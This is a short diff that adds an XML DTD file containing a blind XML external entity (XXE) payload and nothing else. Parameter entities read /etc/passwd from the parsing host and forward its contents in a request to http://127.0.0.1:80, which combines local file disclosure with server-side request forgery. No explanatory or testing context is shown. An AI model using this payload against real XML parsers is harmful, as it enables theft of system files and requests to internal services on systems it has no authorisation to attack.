@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; ssrf SYSTEM 'http://127.0.0.1:80/?data=%file;'>">
+%eval;
+%ssrf;
